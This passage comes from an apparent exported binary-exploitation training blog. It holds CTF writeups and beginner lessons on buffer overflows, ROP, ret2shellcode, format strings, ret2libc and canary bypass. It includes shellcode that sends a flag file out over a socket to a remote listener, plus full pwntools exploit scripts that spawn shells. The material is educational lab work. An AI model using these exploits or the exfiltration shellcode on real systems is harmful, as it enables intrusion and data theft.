arbitrary write and hence writing out shellcode into the RWX region. This was the main aim of the challenge. Writing Reverse Shellcode: # Create a socket. Establish a connection to the ip, port that you have a listening port open on. Finally do Open, Read, Write, to the opened socket to print out the flag. global _start section .text _start: socket: push 0x29 pop rax push 0x02 pop rdi push 0x01 pop rsi xor edx, edx syscall mov r9, rax connect: push 0x2a pop rax mov rdi, r9 ; creating sockaddr data structure push rdx\t; pushing padding push rdx push 0xdeadbeef ; pushing INADDR_ANY push word 0x3905\t; pushing PORT: 1337 push word 0x0002\t; pushing AF_INET mov rsi, rsp add rdx, 0x10 syscall open: mov rax, 2 mov r8, 0x0000000000000067 push r8 mov r8, 0x616c662f65676e65 push r8 mov r8, 0x6c6c6168632e6469 push r8 mov r8, 0x6f72646e612e6674 push r8 mov r8, 0x63733069622f6174 push r8 mov r8, 0x61642f617461642f push r8 mov rdi, rsp mov rsi, 0 mov rdx, 0 syscall read: mov rdi, rax mov rax, 0 mov rsi, rsp mov rdx, 0x50 syscall write: mov rax, 0x1 mov rdi, r9 mov rsi, rsp mov rdx, 0x50 syscall finish: push 0x3c pop rax syscall path: db \u0026#34;/data/data/bi0sctf.android.challenge/flag\u0026#34;, 0 Exploit Script with comments: # Receiveing the Flag on the listening port:\nQuick Mind Map:\nThe Final exploit to exploit can be found here Closing Note: # Congrats to The Flat Network Society for first blooding the challenge. Hope you guys had fun solving the challenge!\n","date":"2024-02-01","externalUrl":null,"permalink":"/writeups/1728230875066-tallocator-bi0sctf/","section":"Writeups","summary":"\u003cp\u003eI created an Android based pwn challenge that involes exploiting a dynamic memory allocator using the webview interface.\u003c/p\u003e","title":"Tallocator [bi0sCTF 2024]","type":"writeups"},{"content":"","date":"2024-01-18","externalUrl":null,"permalink":"/tags/pwn/","section":"Tags","summary":"","title":"Pwn","type":"tags"},{"content":" Try solving these challenge on your own, and use this guide only when needed. If you want more challenges you can search in (pwn-hub) basic attacks\n","date":"2024-01-18","externalUrl":null,"permalink":"/training/","section":"Pwn Training","summary":"","title":"Pwn Training","type":"training"},{"content":"","date":"2024-01-18","externalUrl":null,"permalink":"/tags/youtube/","section":"Tags","summary":"","title":"Youtube","type":"tags"},{"content":"These are beginner friendly videos to get you started into the field of Binary Exploitation.\nIntroduction to Assembly Programming - 00 # Reverse engineering Binaries - 01 # Our First Exploit - 02 | pwntools | ret2win # Bruteforcing the Canary - 03 | Partial Overwrite and ret2win # Global Offset Table and Procedure Linkage Table - 04 # Maybe, In the future I might upload more if it feels right! For now, jaa ne.\n","date":"2024-01-18","externalUrl":null,"permalink":"/training/1728392069994-youtube---stack-basics/","section":"Pwn Training","summary":"\u003cp\u003eThese are beginner friendly videos to get you started into the field of Binary Exploitation.\u003c/p\u003e","title":"Youtube - Stack Basics","type":"training"},{"content":"","date":"2024-01-07","externalUrl":null,"permalink":"/series/pwn-training/","section":"Series","summary":"","title":"Pwn Training","type":"series"},{"content":"This is an initiative taken by team members of ARESx. In this series of pwn-training we will be looking into various types of attacks performed on binaries. This in the first part of the series. We will go in a slow paced fashion covering most of the small details, so anyone can follow along this wonderful course.\nBinary Exploitation: # Any file that does some function/ work is called a binary. Breaking down the word, binary exploitation itself, gives the meaning. We try different ways to break/exploit a program(Binary). This has become a common category in games called CTFs.\nChallenge: # Here we are given a binary and the source code as part of the challenge. Usually the programmer writes in high level languages (human understandable language). Then that is compiled into a machine understandable form - binary. Our job as a exploit dev, need to figure out what this binary does and find the bug to exploit this program.\nvuln binary and vuln c code\nPlay around with both the files a bit and continue reading this blog.\nPrerequisites: # General understanding of linux. Curiosity to learn more by googling. (This is a must) Solution: # General Procedure: # Before stepping in further into the solution, a common set of procedure when followed will make your job easier. Usually when you get a binary,\nCheck the mitigations (check for all permissions, security restrictions) of the binary. Run the binary and get a feel of what it is doing. Try to debug the assembly code of main in a disassembler or debugger. (IDA/ GDB/ Hopper). Note down observations and proceed to write the exploit script. Concept of buffer overflow: # When we can write more than what we are supposed to write into a memory we call it a buffer overflow. Buffer overflows are common bugs when getting started in pwn. Gets is a vulnerable function that has a buffer overflow bug in it. It reads in more data than what the original array/ variable can handle. Multiple attacks will be discussed further on.\nStack # A Stack is a memory segment, ment for storing data when a program is excecuted. This is a temporary storage unit. All the local variables created are stored here.\nRegisters: # Registers are small data holding units. Think of it as variables used by the processor. Each register has its own unique job. source:wikipedia\nMitigations: # Before going into the exploitation, its better to check what mitigations are enabled for a binary. Mitigations are protections that were included to avoid certain attacks. We use the command checksec to see the basic mitigations in a binary.\nchecksec --file ./ret2shellcode If you don\u0026rsquo;t have checksec installed then, open up a terminal and type the below command to install the checksec program.\nsudo apt install checksec CANARY:\nIts a set of characters stored on the stack to make sure no buffer overflows takes place. No eXecute:\nNX Enabled - This makes sure that the code on the stack is not excecuted. NX Disabled - Yea you guessed it, the code on the stack can be excecuted. PIE:\nPosition Independent Excecutable: This mitigation will randomise the address of the code and PLT in the virtual memory each time the program gets excecuted. RWX:\nRead, write and execute : It\u0026rsquo;ll tell us if the binary has segments(parts) that we can read, write and excecute. Code walkthrough: # If you are a curious assembly code lover, make sure to head over to the gdb (GNU debugger) and dig deep. Here I\u0026rsquo;ll go through the c code since its a basic writeup. In most scenarios you are not given the source code as it makes the task much easier. try to get comfy with assembly. Or just use a disassembler lmao.\nJust ignore the ignore_me() function its for standard buffering and stuff. There are 2 functions called win and main.\nmain: # Looking at main function, we see there is a buf variable with size 0x60 and a puts call. There is also a printf that will leak the address of the buf variable. %p is the address pointing to something, with little bit of searching you will know, its the address of buf variable.\nThere is another function called gets(). We know its a dangerous function. lets see why.\nman gets Seems like gets will take input as long as there is a newline character which means we can get past the buf variable and mess things in the stack.\nGDB is a debugger that will break down the program into its assembly code. It makes things easier for a reverse engineer to know what a program does. I have a different version/flavour of gdb called pwndbg. link to download\ndisass main Ok, This is the main function that we saw earlier. Here a stack frame is created with the command push rbp; mov rbp,rsp . In a stack for every new function a new stack frame is created to store the local variables required in that particular function. So when a function exits the stack frame also gets deleted. le memory efficiency.\nPoint to note, The arguments to the function are passed via registers. RDI, RSI, RDX registers are used to store the first, second, third argument to a function.\nHere we see that the 3 arguments are set in the respective registers. Puts function is called with what is in the RDI register. We can also see a printf function which is called with RDI set to RIP+0xe29, which is the start of our buffer. Here RIP refers to the instruction pointer. Finally a gets is also called, which is exploited in our case. Now, we will set a break point in GDB to stop at a particular location that we specify during the runtime. By doing this, at a specific instruction we can know what the registers are holding and what changes are made at that point of time in the excecution.\nTo set a breakpoint b * address of the instruction, in this case set a break point at ret instruction in main.\nb* 0x0000000000401238 Take some time of your own, play around with the binary and see if you can crash the binary in some way.\nGreat if you got a segfault else no worries. Well do it together. Run the binary in gdb with r and then give 0x60 \u0026ldquo;a\u0026quot;s, this will fill up the buf variable with all that garbage. After those random \u0026ldquo;a\u0026quot;s maybe create an offset pattern like 111111112222222233333333. So incase the binary crashes we can see exactly where it crashed.\nSegfault - It is caused because our program is trying to read a part of memory thats invalid\nIn our case we overflowed the buf variable with \u0026ldquo;a\u0026quot;s and filling the RBP with 11111111 and finally making the return address point to 22222222, Since there is no 22222222 address in memory, we will get a segfault. Whenever a program tries to jump to an address that is not there you will recieve a segfault error.\nYou can see all the values set in the registers like RAX, RBX, RCX. To our intrest we need the RSP. The RSP is the stack pointer or the register that holds infomartion about the next location to excecute. But do you see something fishy there ? Exactly we can control the return address of main. This means that we can make the binary excecute what we want.\nAim: # As an attacker our aim is to make this binary give a shell for us in the server. A shell is a way of getting complete access on whatever target we are attacking. In future blogs, you might also see that you wont have the root (admin) access in a shell. You have to do several privilage escalations to make yourself root, though all of those fun stuff are for another time.\nSo we looked at a win() function earlier, this will land us a nice neat shell! Though there wont be any win() function in real life applications, its your task to somehow find ways to get a shell in the server.\nReturn to win: # Now since we control the return address of main function, why not lets change the return address to win function?\nWin function does execve(\u0026quot;/bin/sh\u0026rdquo;) -\u0026gt; which means that it\u0026rsquo;ll call a system function called execve and excecute the command /bin/sh which is a shell. ok lets start writing our script in python. First we will import pwntools library to make things easier. Next we will connect to our binary and send/recieve messages.\nfrom pwn import * # Importing the library called pwntools p = process(\u0026#34;ret2shellcode\u0026#34;) # create a instance/process with the binary. helps to interact with the program. p.sendline(b\u0026#34;a\u0026#34;*0x60 + b\u0026#34;a\u0026#34;*8 + p64(0x00000000004011a5)) # Send the payload(attack input) to the program. p.interactive() #If we get a shell make it interactive. Here in the sendline command I am giving \u0026ldquo;a\u0026rdquo; * 0x60 to fill the buf variable and extra \u0026ldquo;a\u0026rdquo; * 8 to fill the rbp (base pointer) and then the address of win function. wait what is that p64() ?\np64() function will make your address into little endian format. To know more about formats\nRun this script and lets see what we get. SHOOT you get something called EOF (End Of File) ?\nYou can attach a gdb with your script and see where your script will crash / how it runs. But we are already given the c code and we know that there was some additional checks done to the execve.\nSo we have to somehow make the arg1 = 0xdeadbeef and arg2 = 0xcafebabe. This is where return oriented programming comes into picture.\nReturn Oriented Programming: # This is a type of attack where we use static code or code thats been used to make this binary. we will combine one or many such code snippets to form a chain that\u0026rsquo;ll do something valuable to us.\nSince win is a function with arg1 and arg2 as parameters. We can set RDI = 0xdeadbeef and RSI = 0xcafebabe. Then call win function. Exploit [ret2win]: # Firstly we can get all the gadgets/code snippets in the binary with ROPgadget. Then lets take out the ones that we want.\npython3 ROPgadget.py --binary ../Documents/pwn-train/pwn1/ret2shellcode We can pop the registers to put the values we want and since every gadget has a return attached to it, we can call win function after those gadgets.\nfrom pwn import * p = process(\u0026#34;ret2shellcode\u0026#34;) pause() p.sendline(b\u0026#34;a\u0026#34;*0x60 + b\u0026#34;a\u0026#34;*8 + p64(0x000000000040129b) + p64(0xdeadbeef) + p64(0x0000000000401299) + p64(0xcafebabe) + p64(0) + p64(0x00000000004011a5)) p.interactive() Exploit [simpler version]: # I know you went through all the struggle to set the arguments right, but if you can control the return address and jump literally anywhere, then why not just jump directly on the execve function.\nfrom pwn import * p = process(\u0026#34;ret2shellcode\u0026#34;) p.sendline(b\u0026#34;a\u0026#34;*0x60 + b\u0026#34;a\u0026#34;*8 + p64(0x00000000004011d1)) # address to execve p.interactive() Here we avoided the constraints and directly jumped to the execve funtion. Clever of you.\nreturn 2 shellcode: # This is the third and final way that we will discuss in this blog. Do you remember the leak at the begining ? Yes we will use the leak to get a shell. This time ignore the win() function. Without the help of helper function get a shell yourself :D .\nRemember at the begining I said this binary is NX disabled. So we can basically store the commands that we want to excecute in buf variable and then jump back to the buf variable thereby excecuting whatever we want.\nA shellcode is a set of instruction that will give you a shell or does some function that you want when excecuted.\nFirst step is to store the leak in a variable. We will use recvline function here to recv the output given by the program. Write all the commands that you want to excecute to get a shell (pwntools has inbuilt functionalities :D ). Fill the gap between the return and the shellcode with dummy instructions called nop. Jump back to buf variable. #!/usr/bin/env python3 from pwn import * def start(): global p if args.REMOTE: p = remote(\u0026#39;localhost\u0026#39;, 1337) else: p = elf.process() # start the process. context.binary = elf = ELF(\u0026#39;./ret2shellcode\u0026#39;) start() buf_addr = int(p.recvlines(2)[-1].split()[-1], 16) # recvlines and then get the leak payload = asm(shellcraft.linux.sh()) # generates a shellcode compatible with linux systems payload += b\u0026#39;\\x90\u0026#39;*(104 - len(payload)) # spans the gap between buf variable and return payload += p64(buf_addr) # address of the buf variable p.sendline(payload) # send the payload p.interactive() # doesnt close the shell and keeps it open for us. p.close() Hope you liked the pwn training 1. More training writeups coming soon ! :D\n","date":"2024-01-07","externalUrl":null,"permalink":"/training/1728228874517-return-to-shellcode-train-1/","section":"Pwn Training","summary":"","title":"Return to Shellcode [train 1]","type":"training"},{"content":"","date":"2024-01-07","externalUrl":null,"permalink":"/series/","section":"Series","summary":"","title":"Series","type":"series"},{"content":"","date":"2024-01-07","externalUrl":null,"permalink":"/tags/training/","section":"Tags","summary":"","title":"Training","type":"tags"},{"content":"This is the 2nd challenge in the in the series. In this training we will go through the format string exploitation technique. We are provided 2 challenges of the same vulnerability. Lets go through them one by one.\nChallenge 1: # You can download the binary and the source down below.\nvuln binary and vuln c code\nSolution: # Mitigations: # Lets do the usual drill of checking the mitigations of this binary.\nchecksec --file ./flagleak RELRO:\nPartial RELRO - In the attackers point of view, the GOT (Global Offset Table) is readable and writeable. CANARY:\nThere is no canary so we can do a buffer overflow. No eXecute:\nNX Enabled - this makes sure that the code on the stack is not excecuted. PIE:\nNo PIE: We know the address of the binary at runtime, Since the binary is not position independent. Code walkthrough: # As said in previous training you can dig in deep into the assembly but to make things simpler we are given the source code. (in most CTF / Real life applications it\u0026rsquo;ll be helpful if you know assembly).\nIn the main function there is an obvious buffer overflow. Since there is a buffer of size 0x60 but the input is reading 0x60+8+16 (lmao author made is quite obvious). Ok we know the basic buffer overflow pattern right?\nI hope you can come to the print_flag function by your own. (If you could\u0026rsquo;nt, no probs go here ). Let us now see what is there in the print_flag function.\nIt is reading a file called flag.txt. If you dont have the file in your current directory it will give you an error. so create a file with a random value. In this task our main goal is to get the value of the flag. A flag is basically a valuable object in games called ctfs likewise in security contests these flags give you points. Wait does it mean you can\u0026rsquo;t get a shell in this challenge :( ? Umm\u0026hellip; You can spawn a shell in this challenge, but in this module we will only try out format string exploitation. If you are too keen to know, then check out what libc leak is. Dont worry we will see them in the later parts of this training.\nVulnerability: # Before going into the vuln lets see how printf works.\nprintf: # printf is a function in the glibc library. It basically has 2 parts, a format and an argument.\nprintf(\u0026#34;text here and %x %p %s \u0026#34;, a,b,c) So in the first field we fill it with text and format specifiers to print the values in the corresponding second field (variables). The different format specifiers like %x %p %s denote the datatype of the variable; like hex, pointer, string respectively.\nExploitation: # So what if we are able to control the first field. Imagine being able to read more values from 2nd field, more than the available arguments ? Will the program crash ? will it send some garbage data ? :thinking:\npoints to note:\nThe arguments are stored in the stack. printf will take values from the stack. So, the extra format specifiers we specified will continue to take the values stored in the stack. Lets do it live. [I am using pwntools template. to make a template go to terminal and type pwn template \u0026gt; xpl.py ]. Now go to vim and continue writing your exploit from the buffer overflow to the print_flag function. (if you are lazy you can copy the script down below :( )\n#!/usr/bin/env python3 from pwn import * # Set up pwntools for the correct architecture context.update(arch=\u0026#39;amd64\u0026#39;) exe = \u0026#39;./flagleak\u0026#39; elf = ELF(\u0026#34;flagleak\u0026#34;) def start(argv=[], *a, **kw): \u0026#39;\u0026#39;\u0026#39;Start the exploit against the target.\u0026#39;\u0026#39;\u0026#39; if args.GDB: return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw) else: return process([exe] + argv, *a, **kw) gdbscript = \u0026#39;\u0026#39;\u0026#39; b* main continue \u0026#39;\u0026#39;\u0026#39;.format(**locals()) #=========================================================== # EXPLOIT GOES HERE #=========================================================== p = start() #make a connection to the flagleak binary p.recvline() # recv the line given by the binary p.send(b\u0026#34;A\u0026#34;*(0x60+8) + p64(0x401016) + p64(elf.sym[\u0026#39;print_flag\u0026#39;]) ) # send a bufferoverflow to the binary to redirect code excecution to print_flag p.interactive() If you note there, I have added a ret instruction inbetween the print_flag function and rbp. This is to ensure stack alignment issues dont happen.\nOk now set a break point right at the printf function in the print_flag function. To do that change the main to the address of printf in the gdbscript. Running your script in vim is very easy.\nESC, :w | !./% GDB NOASLR In the above command we are writing the script with w, running a bash command with ! and excecuting the file ./%. % -\u0026gt; represents the current file. GDB NOASLR -\u0026gt; attachs gdb with ASLR disabled.\np = start() p.recvline() p.send(b\u0026#34;A\u0026#34;*(0x60+8) + p64(0x401016) + p64(elf.sym[\u0026#39;print_flag\u0026#39;]) ) p.recvline() p.sendline(\u0026#34;%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-\u0026#34;) p.interactive() After playing a little bit with gdb and format strings you will know that most of the stuff thats leaked is from the stack. Now you can also inspect the stack in gdb pwndbg with stack 20. Wait a minute!! Do you see there is an address in stack that contains all the contents of our flag file ? Yes when you read and store a file, its contents will be stored on the stack.\nAlso in the leaked values we can see that our flag address is also leaked.\nNow if you came this far you might have come across the format specifier %s -\u0026gt; this will get the contents stored in an address. So what if instead of printing the address, lets print the string pointed by the address. (So should we change all the p to s ?). hmm You do it only if all the values on the stack are valid address that points to some string. In this case its better to just count which offset our string is and then print it.\nCounting the offset we see that our string is in 12th position. So we can just print that position with a trick. %{offset}$p will print the the value in stack at that offset. So lets try it.\nYAY we managed to print it out, now finally we just have to print the contents of the address so change the p to s now. We managed to print something on the stack. (well done)\nChallenge 2: # Lets take this one step further and make the an exploit for another harder* binary.\nvuln binary and vuln c code\nMitigations: # Exactly the same mitigations except PIE. PIE ENABLED: this time we cant jump directly to another piece of code. The base address of binary will be randomised. Go ahead and give this a try.\nCode walkthrough: # In the main function we can see that a buffer variable shot is initialised and it is being used to get an input and later printed on to the screen. After that a gets function is used. We already know that gets function does not care about the size of the buffer, it will read until a newline. lets spam so %p in the shot variable and see what out put we are getting.\np = start() p.recvline() p.sendline(\u0026#34;%p \u0026#34;*(0x60)) p.interactive() Do you see a lot of garbage ? Along with that do you see some amazing addresses ?\nExactly, the address 0x0000555555555222 is the start of main. So we have overcome the problem of PIE, since we know a address in the binary, we can calculate the relative offsets of other functions as well. Lets see what helper function we are provided with now.\nROP: # A win function: this will call execve(\u0026quot;/bin/sh\u0026quot;), its a ROP challenge and I am pretty sure you know how to do it. There is a small catch here. We have to calculate the relative offset of the addresses since PIE is enabled, so manually calculate the distance of the gadgets and the win function.\np = start() p.recvline() p.sendline(\u0026#34;%p \u0026#34;*(27)) l = p.recvline().split() leaked_main = int(l[-1], 16) win_func = leaked_main - (0x555555555222-0x5555555551c8) binary_start = leaked_main - (0x555555555222-0x555555554000) log.info(\u0026#34;Leaked main address: \u0026#34; + str(l[-1])) log.info(\u0026#34;win function: \u0026#34;+ str(win_func)) log.info(\u0026#34;Binary Start: \u0026#34;+ str(leaked_main - (0x555555555222-0x555555554000))) p.interactive() Here, I found out that the 27th position, the address of main is printed so I put all the leaked stuff into a list (You can just strip it and store the main address value too). Next I manaually subtract the offset and add it to get the address from the leaked value. Also just to be sure everything is correct, I log all the info I get and verify them in gdb.\nNow its simple, just call the win function with its argument set to 0xdeadbeefcafebabe (RDI).\nFull Exploit:\n#!/usr/bin/env python3 from pwn import * # Set up pwntools for the correct architecture context.update(arch=\u0026#39;amd64\u0026#39;) exe = \u0026#39;./ret2win_pie\u0026#39; elf = ELF(\u0026#34;ret2win_pie\u0026#34;) def start(argv=[], *a, **kw): \u0026#39;\u0026#39;\u0026#39;Start the exploit against the target.\u0026#39;\u0026#39;\u0026#39; if args.GDB: return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw) else: return process([exe] + argv, *a, **kw) gdbscript = \u0026#39;\u0026#39;\u0026#39; b* main+67 continue \u0026#39;\u0026#39;\u0026#39;.format(**locals()) #=========================================================== # EXPLOIT GOES HERE #=========================================================== p = start() p.recvline() p.sendline(\u0026#34;%p \u0026#34;*(27)) l = p.recvline().split() leaked_main = int(l[-1], 16) win_func = leaked_main - (0x555555555222-0x5555555551c8) binary_start = leaked_main - (0x555555555222-0x555555554000) log.info(\u0026#34;Leaked main address: \u0026#34; + str(l[-1])) log.info(\u0026#34;win function: \u0026#34;+ str(win_func)) log.info(\u0026#34;Binary Start: \u0026#34;+ str(leaked_main - (0x555555555222-0x555555554000))) p.sendline(b\u0026#34;A\u0026#34;*0x60 + b\u0026#34;B\u0026#34;*8 + p64(binary_start+0x00000000000012eb) + p64(0xdeadbeefcafebabe) + p64(win_func)) p.interactive() Hope you guys enjoyed the pwn training 2 more amazing challenges are yet to come !! Happy hacking.\n","date":"2024-01-06","externalUrl":null,"permalink":"/training/1728229152748-format-string-exploitation-train-2/","section":"Pwn Training","summary":"\u003cp\u003eThis is the 2nd challenge in the in the series. In this training we will go through the format string exploitation technique. We are provided 2 challenges of the same vulnerability. Lets go through them one by one.\u003c/p\u003e","title":"Format String Exploitation [train 2]","type":"training"},{"content":"In this blog we will be trying to leak a libc address and try to get a shell by calling system. Here we will look into 2 challenges with similar attacks but slight variations.\nChallenge 1: # Here we are given a binary and the source for the binary.\nvuln binary and vuln c code\nSolution: # Mitigations: # Lets check out the mitigations for this program.\nchecksec --file ./ret2libc If you don\u0026rsquo;t have checksec installed then\nsudo apt install checksec RELRO:\nPartial RELRO - the got is writeable, nothing much to bother here. CANARY:\nNo canary, we can do a overflow peacefully :) No eXecute:\nNX Enabled - this makes sure that the code on the stack is not excecuted. PIE:\nPIE Disabled, we know the address of all the code in the binary. Code walkthrough: # main function:\nSince gets is a vulnerable function, we can use it to write more data than what the buffer can hold. Also there are no win functions this time. We have to rely on the shared object. Lets explore this challenge now. Global Offset Table: # This challenge requires you to know the basics of GOT and PLT. In short GOT is a set of address that points to the function in the glibc (shared library). To know more about Global offset table go ahead to my old blog.\nExploit Idea: # Our aim right now is to leak an address in the libc (shared library). Since ASLR will randomise the library we cant access the libc function with same address all the time. There is a function called system in the libc which will pop a shell if we give the address of /bin/sh as the parameter. → We can use the puts function to call the got of puts, since its already called by our program, the GOT of this function will be resolved ( real address pointing to libc will be filled ).\nPseudo code: # note: arguments to functions are stored via registers, the first argument is stored in RDI.\n\u0026#34;A\u0026#34;*(offset) + p64(address of pop RDI) + p64(GOT address of puts) + p64(PLT address of puts) + p64(address of main) This code will fill the buffer with garbage and store the GOT address of puts inside the RDI register and then calls puts, this will leak the puts libc address.\nNow we have the libc puts address. All functions and variables in the libc is relative to one another, libc as a whole might change its position but the elements (functions, variables) will be at the same relative distance from one another. we can calculate the address of string \u0026ldquo;/bin/sh\u0026rdquo; and the address of system function, then we can call the system with the argument to pop a shell. note: You might face a error in the statement movabs. If you encounter this problem, you can rectify it by adding a return instruction before the call to a glibc function, Since adding a return address will make the RSP 16 byte aligned.\nExploit: # In real life situation you are not probably using the same libc as the software dev, So to find out the libc version go to libc.blukat.me.\nSo always the last 3 digits (hex) of the leak will be same. Use this as an advantage to select your libc version.\nBelow is the commented solution.\n#!/usr/bin/env python3 from pwn import * # Set up pwntools for the correct architecture context.update(arch=\u0026#39;amd64\u0026#39;) exe = \u0026#39;./ret2libc\u0026#39; elf = ELF(\u0026#34;./ret2libc\u0026#34;) # ./exploit.py DEBUG NOASLR def start(argv=[], *a, **kw): \u0026#39;\u0026#39;\u0026#39;Start the exploit against the target.\u0026#39;\u0026#39;\u0026#39; if args.GDB: return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw) else: return process([exe] + argv, *a, **kw) # ./exploit.py GDB gdbscript = \u0026#39;\u0026#39;\u0026#39; b* 0x00000000004011c7 \u0026#39;\u0026#39;\u0026#39;.format(**locals()) #=========================================================== # EXPLOIT GOES HERE #=========================================================== p = start() p.recvuntil(\u0026#34;Are you in?\u0026#34;) # recv the output sent by the program. p.sendline(b\u0026#34;A\u0026#34;*0x60 + b\u0026#34;B\u0026#34;*8 + p64(0x0000000000401016) + p64(0x000000000040122b) + p64(elf.got[\u0026#39;puts\u0026#39;]) + p64(elf.plt[\u0026#39;puts\u0026#39;]) + p64(elf.sym.main)) # filling the buffer and RBP + return instruction to tackle the alignment issues + pop RDI to fill it with address of the puts function. add main to return back to main function p.recvline() # recv unwanted bytes. leak_puts =hex( u64((p.recvline().rstrip()).ljust(8, b\u0026#34;\\x00\u0026#34;))) # recv the puts function and strip the front and back, unpack it and store it as hex. log.info(\u0026#34;puts: \u0026#34;+str(leak_puts)) # make sure you get a address in the libc by logging it. p.recvuntil(\u0026#34;Are you in?\u0026#34;) # recv output. p.sendline(b\u0026#34;B\u0026#34;*0x60 + b\u0026#34;C\u0026#34;*8 + p64(0x000000000040122b) + p64(int(leak_puts, 16) + 0x13000a) + p64(int(leak_puts, 16)-0x32190)) # fill garbage in buffer and pop RDI to fill it with a pointer to \u0026#34;bin/sh\u0026#34; call system. p.interactive() Challenge 2: # In this second challenge you are required to perform the same ret2libc but with more security measures to bypass. Below you can download source and bianry.\nvuln binary and vuln c code\nSolution: # Lets do the drill of checking the mitigations.\nMitigations: # Canary:\nA set of characters that will be checked before returning. If the value has changed the program aborts. No eXecute:\nNX Enabled - this makes sure that the code on the stack is not excecuted. PIE:\nPIE Enabled, We dont know the address of the code for the binary. Code Walkthrough: # There is only a main function. We can see that, here we are getting an input and printing it in an unsafe way. Here we can take advantage of this to leak data in the binary. Not sure about format string ? Go Here. In the next section we can use the gets function to input more data than the buffer can store.\nCanary: # Set of characters that is placed in between the return address and the buffer. When a buffer overflow occurs the canary checks itself with a memory copy. If the values has been modified then we know a overflow happened and the program will abort.\nBypass: Basically we can leak the canary from format strings and place the canary in the correct spot in the payload. Since we over write the canary with the real canary, it seems there was no overflow.\nExploit: # Lets try to leak some variables from the stack by giving some %p. We can store all of them in a list and analyse what is what. p = start() # phase 1 : leaking binary and libc address p.sendlineafter(\u0026#34;So you wanna try again. Go ahead :)\u0026#34;, b\u0026#34;%p \u0026#34;*25) all_leaked = str(p.recvline()).split() log.info(\u0026#34;Info leaked: \u0026#34; + str(all_leaked)) We can confirm that the address 0x7ffff7faea03 is from the libc, nice ! we already got a leak. Attach gdb and check what the address corresponds to. Ok this is a libc function, we can calculate the offset of this function from the libc base. Now lets see if any other important info is leaked. :thinking:\nAddress that is 0x5555555550a0, is a address that is winthin the binary, we can calculate the offset like the previous one.\nFinally lets see if the canary is also included in the stack. Yes it is indeed inside the stack and can clearly see it.\nNow to find the position of canary we can set a break point in the address before the __stack_chk_fail@plt. The stack will be stored in the RCX register. Create a offset pattern then see what value is in the RCX register and place the canary value there to complete the exploit.\nNow it is simple. We can simply calculate all the relative offset from the base of binary and libc, So we can now pop rdi to populate it with the address of /bin/sh and call system. Below I have given the commented solution.\n#!/usr/bin/env python3 from pwn import * # Set up pwntools for the correct architecture context.update(arch=\u0026#39;amd64\u0026#39;) exe = \u0026#39;./ret2libc_canary\u0026#39; elf = ELF(\u0026#34;./ret2libc_canary\u0026#34;) libc = ELF(\u0026#34;/lib/x86_64-linux-gnu/libc.so.6\u0026#34;) # ./exploit.py DEBUG NOASLR def start(argv=[], *a, **kw): \u0026#39;\u0026#39;\u0026#39;Start the exploit against the target.\u0026#39;\u0026#39;\u0026#39; if args.GDB: return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw) else: return process([exe] + argv, *a, **kw) # ./exploit.py GDB gdbscript = \u0026#39;\u0026#39;\u0026#39; b* main+164 \u0026#39;\u0026#39;\u0026#39;.format(**locals()) #=========================================================== # EXPLOIT GOES HERE #=========================================================== p = start() # phase 1 : leaking binary and libc address p.sendlineafter(\u0026#34;So you wanna try again. Go ahead :)\u0026#34;, b\u0026#34;%p \u0026#34;*25) # send format specifier to leak data from the stack p.recvline() # recv the new line. all_leaked = str(p.recvline()).split() # store all leaked data as a list. log.info(\u0026#34;Info leaked: \u0026#34; + str(all_leaked)) # log it to make sure everything works fine libc_base = int(str(all_leaked[0])[2:], 16) - 2013699 # take the first element in the list which is a libc function. log.info(\u0026#34;Libc Base: \u0026#34;+ str(hex(libc_base))) # log it binary_base = int(str(all_leaked[-6])[2:], 16) - 4256 # calculate the binary offset from the leak. log.info(\u0026#34;binary_base: \u0026#34; + str(hex(binary_base))) # log it canary = int(str(all_leaked[-4])[2:], 16) # store the canary from the leak # pahse 2 : usign the leak to ret2libc buf = b\u0026#34;A\u0026#34;*(0x60+8) + p64(canary) # fill the buffer till the canary and overwrite the canary with real one. buf += p64(binary_base+0x0000000000001016) # random garbage to fill the rbp buf += p64(binary_base+0x00000000000012cb) # return address print(next(libc.search(b\u0026#39;/bin/sh\\x00\u0026#39;))) # find the address of libc bin/sh buf += p64(libc_base + next(libc.search(b\u0026#39;/bin/sh\\x00\u0026#39;))) buf += p64(binary_base+0x0000000000001016) # return to make sure stack is aligned before a glibc call buf += p64(libc_base + libc.sym.system) # call system. p.sendlineafter(\u0026#34;Missed again??? I\u0026#39;m so disappointed.\u0026#34;, buf) p.interactive() Hope you loved this challenge in the training !Happy Hacking! :D\n","date":"2024-01-05","externalUrl":null,"permalink":"/training/1728229192015-ret-to-libc-train-3/","section":"Pwn Training","summary":"\u003cp\u003eIn this blog we will be trying to leak a libc address and try to get a shell by calling system. Here we will look into 2 challenges with similar attacks but slight variations.\u003c/p\u003e","title":"Ret-to-libc [train 3]","type":"training"},{"content":"Congrats on reaching this level. This level acts as a checkpoint (name suggests). You will be combining the idea of format strings, buffer overflows, canaries from previous blogposts. Try this level on your own and check for hints when stuck.\nChallenge: # Download below challenge file.\nFILES\nSolution: # Mitigations: # No need to explain mitigations right ? These are different protections created to rule out certain types of attacks, make hackers life a little harder.\nCode Walkthrough: # We are given the c code. Here in the main program, there is a while loop to run the format string vulnerability and finally a compare statement leading to a fgets call.\nSample run: # Runing the file tells us there is a format string exploit. Exploit idea: # Here the challenge is direct and was made to recap what we learnt in the previous blogs. The attack plan is\nleaking a binary address, libc address, canary. make the strength variable = \u0026ldquo;STRENGTH\u0026rdquo; increase the size variable to a much larger value for a buffer overflow. (tricky part) Format string exploit: # We already know what format strings are\u0026hellip; now leak the stack little by little and see what useful values you get. I got the following values:\n16: my input 49: canary 51: a libc address 56: a binary address Now you got the values so calculate the address relatively with the binary/libc or initialise the binary and libc as elf with the help of pwntools ELF() function.\n#Need to know the libc. (used by default libc for local purpose) elf.address = int((str(leak[2])[4:-3]), 16) - elf.sym.__libc_csu_init libc.address = int((str(leak[1])[4:-1]), 16) - 159923 canary = int((str(leak[0])[4:-1]), 16) #My weird way of receiving and splitin. Formats again: # The second task was to change the value of the global variables and make it favourable for us.\nfmt = fmtstr_payload(16, { elf.sym.size: 500, elf.sym.strength: u64(b\u0026#34;STRENGTH\u0026#34;), }) Here I am making the size variable much larger than buffer size, making strength variable equal to \u0026ldquo;STRENGTH\u0026rdquo; to pass the 